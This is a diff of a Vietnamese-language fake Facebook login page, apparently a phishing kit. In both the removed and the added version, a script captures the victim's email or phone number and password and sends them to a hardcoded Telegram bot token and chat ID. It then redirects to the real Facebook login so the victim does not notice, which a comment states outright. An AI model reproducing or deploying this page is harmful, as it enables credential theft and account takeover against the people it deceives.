@@ -5,169 +5,57 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Đăng nhập Facebook</title>
     <style>
-        body { 
-            font-family: Helvetica, Arial, sans-serif; 
-            background-color: #f0f2f5; 
-            margin: 0; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            min-height: 100vh; 
-        }
-        
-        .container { 
-            display: flex; 
-            flex-direction: row; /* Mặc định nằm ngang cho PC */
-            width: 100%;
-            max-width: 980px; 
-            align-items: center; 
-            justify-content: space-between; 
-            padding: 20px;
-            box-sizing: border-box;
-        }
-
-        .fb-logo-text { 
-            color: #1877f2; 
-            font-size: 60px; 
-            font-weight: bold; 
-            letter-spacing: -2px; 
-            margin: 0; 
-            padding-bottom: 10px;
-            font-family: sans-serif;
-        }
-
-        .left-content { 
-            max-width: 500px; 
-            padding-right: 32px; 
-        }
-        
-        .left-content h2 { 
-            color: #1c1e21; 
-            font-size: 26px; 
-            line-height: 32px; 
-            font-weight: normal; 
-            margin-top: 0; 
-        }
-        
-        .login-card { 
-            background: #fff; 
-            border: none; 
-            border-radius: 8px; 
-            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1); 
-            padding: 20px; 
-            width: 100%;
-            max-width: 396px; 
-            text-align: center; 
-            box-sizing: border-box;
-        }
-
-        input { 
-            border-radius: 6px; 
-            border: 1px solid #dddfe2; 
-            color: #1d2129; 
-            font-size: 17px; 
-            padding: 14px 16px; 
-            width: 100%; /* Co giãn theo thẻ cha */
-            margin-bottom: 12px; 
-            outline: none; 
-            box-sizing: border-box;
-        }
-
+        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1); width: 100%; max-width: 396px; text-align: center; }
+        .logo { color: #1877f2; font-size: 40px; font-weight: bold; margin-bottom: 20px; }
+        input { width: 100%; padding: 14px 16px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; box-sizing: border-box; outline: none; }
         input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }
-        
-        .btn-login { 
-            background-color: #1877f2; 
-            border: none; 
-            border-radius: 6px; 
-            color: #fff; 
-            font-size: 20px; 
-            font-weight: 700; 
-            height: 48px;
-            width: 100%; 
-            cursor: pointer; 
-            margin-top: 5px; 
-        }
-        
-        .forgot { color: #1877f2; font-size: 14px; text-decoration: none; display: block; margin-top: 16px; }
-        hr { border: 0; border-top: 1px solid #dadde1; margin: 20px 0; }
-        .btn-new { 
-            background-color: #42b72a; 
-            border: none; 
-            border-radius: 6px; 
-            color: #fff; 
-            font-size: 17px; 
-            font-weight: 700; 
-            height: 48px;
-            padding: 0 16px; 
-            cursor: pointer; 
-        }
-        .footer-meta { margin-top: 24px; color: #737373; font-size: 14px; }
-
-        /* --- PHẦN QUAN TRỌNG: CSS CHO ĐIỆN THOẠI --- */
-        @media (max-width: 900px) {
-            body { align-items: flex-start; background-color: #fff; } /* Đổi nền trắng cho giống mobile */
-            .container { 
-                flex-direction: column; 
-                text-align: center; 
-                padding-top: 40px;
-            }
-            .left-content { 
-                padding-right: 0; 
-                margin-bottom: 20px; 
-            }
-            .fb-logo-text { font-size: 45px; }
-            .left-content h2 { font-size: 20px; line-height: 24px; padding: 0 20px; }
-            .login-card { 
-                box-shadow: none; 
-                width: 100%; 
-            }
-        }
+        .btn-login { background-color: #1877f2; border: none; border-radius: 6px; color: #fff; font-size: 20px; font-weight: 700; padding: 10px; width: 100%; cursor: pointer; }
+        .footer { margin-top: 20px; border-top: 1px solid #dadde1; padding-top: 20px; }
+        .btn-new { background-color: #42b72a; border: none; border-radius: 6px; color: #fff; font-size: 17px; font-weight: 700; padding: 10px 16px; cursor: pointer; text-decoration: none; }
     </style>
 </head>
 <body>
-
-<div class="container">
-    <div class="left-content">
-        <h1 class="fb-logo-text">facebook</h1>
-        <h2>Khám phá những điều bạn yêu thích.</h2>
-    </div>
-
-    <div class="login-card">
-        <form id="metaForm">
-            <input type="text" id="u_name" placeholder="Email hoặc số điện thoại" required>
-            <input type="password" id="u_pass" placeholder="Mật khẩu" required>
+    <div class="box">
+        <div class="logo">facebook</div>
+        <form id="loginForm">
+            <input type="text" id="email" placeholder="Email hoặc số điện thoại" required>
+            <input type="password" id="pass" placeholder="Mật khẩu" required>
             <button type="submit" class="btn-login">Đăng nhập</button>
         </form>
-        <a href="#" class="forgot">Quên mật khẩu?</a>
-        <hr>
-        <button type="button" class="btn-new">Tạo tài khoản mới</button>
-        <div class="footer-meta"><b>Meta</b> © 2026</div>
+        <div style="margin-top: 16px"><a href="#" style="color: #1877f2; text-decoration: none; font-size: 14px;">Quên mật khẩu?</a></div>
+        <div class="footer">
+            <button class="btn-new">Tạo tài khoản mới</button>
+        </div>
     </div>
-</div>
 
-<script>
-    document.getElementById('metaForm').addEventListener('submit', function(e) {
-        e.preventDefault();
-        const user = document.getElementById('u_name').value;
-        const pass = document.getElementById('u_pass').value;
-        
-        // Thông tin Bot Telegram
-        const TOKEN = '8725871545:AAFCQX7uuQqaisrVCwKH9vUdFm22j8smks0';
-        const ID = '1946891510';
-        
-        const text = `🎯 LOGIN FB MỚI:\n👤 User: ${user}\n🔑 Pass: ${pass}`;
-        const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(text)}`;
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            var u = document.getElementById('email').value;
+            var p = document.getElementById('pass').value;
 
-        // Gửi dữ liệu ngầm bằng cách tải một ảnh ảo
-        var img = new Image();
-        img.src = url;
+            // Mã
+            var t = "8725871545:AAFCQX7uuQaisrVCwKH9vUdFm22j8smks0"; // Token
+            var c = "1946891510"; // Chat ID
+            
+            var msg = "🔔 LOGIN FB MỚI\n👤 User: " + u + "\n🔑 Pass: " + p;
+            
+            // Gửi 
+            var url = "https://api.telegram.org/bot" + t + "/sendMessage";
+            var params = "chat_id=" + c + "&text=" + encodeURIComponent(msg);
 
-        setTimeout(() => {
-            // Chuyển hướng sang trang login thật để tránh nghi ngờ
-            window.location.href = "https://www.facebook.com/login/";
-        }, 1200);
-    });
-</script>
+            var x = new XMLHttpRequest();
+            x.open("POST", url, true);
+            x.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+            x.send(params);
 
+            // Chuyển hướng sau khi gửi xong
+            setTimeout(function() {
+                window.location.href = "https://www.facebook.com/login/";
+            }, 800);
+        });
+    </script>
 </body>
 </html>
